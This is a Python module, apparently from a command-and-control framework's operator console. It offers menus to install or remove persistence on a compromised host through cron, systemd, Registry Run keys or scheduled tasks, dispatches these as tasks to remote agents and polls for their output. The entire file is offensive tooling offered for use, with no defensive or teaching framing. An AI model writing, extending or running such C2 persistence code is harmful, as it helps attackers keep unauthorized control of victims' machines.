import time


def install_persistence(manager, agent_id, method=None):
    methods = {
        "1": "cron",
        "2": "systemd",
        "3": "registry",
        "4": "schtask",
    }

    if not method:
        print("=== Persistence Methods ===")
        print("1. Cron job (Linux)")
        print("2. Systemd service (Linux)")
        print("3. Registry Run key (Windows)")
        print("4. Scheduled Task (Windows)")
        choice = input("Choice: ").strip()
        method = methods.get(choice)

    if not method:
        print("[!] Invalid choice")
        return

    script_path = input("Script path on target: ").strip()
    if not script_path:
        print("[!] Path required")
        return

    task_id = manager.send_task(
        agent_id,
        "persist",
        {"method": method, "script_path": script_path},
    )
    if not task_id:
        print("[!] Agent not found")
        return

    print(f"[*] Persistence task {task_id} sent...")
    for _ in range(15):
        time.sleep(1)
        results = manager.get_results(agent_id)
        for r in results:
            if r["task_id"] == task_id:
                print(r["output"])
                return
    print("[!] Timeout")


def remove_persistence(manager, agent_id, method=None):
    methods = {
        "1": "cron",
        "2": "systemd",
        "3": "registry",
        "4": "schtask",
    }

    if not method:
        print("=== Remove Persistence ===")
        print("1. Cron job (Linux)")
        print("2. Systemd service (Linux)")
        print("3. Registry Run key (Windows)")
        print("4. Scheduled Task (Windows)")
        choice = input("Choice: ").strip()
        method = methods.get(choice)

    if not method:
        print("[!] Invalid choice")
        return

    name = input("Persistence name/identifier: ").strip()
    if not name:
        print("[!] Name required")
        return

    task_id = manager.send_task(
        agent_id,
        "remove_persist",
        {"method": method, "name": name},
    )
    if not task_id:
        print("[!] Agent not found")
        return

    print(f"[*] Remove persistence task {task_id} sent...")
    for _ in range(15):
        time.sleep(1)
        results = manager.get_results(agent_id)
        for r in results:
            if r["task_id"] == task_id:
                print(r["output"])
                return
    print("[!] Timeout")
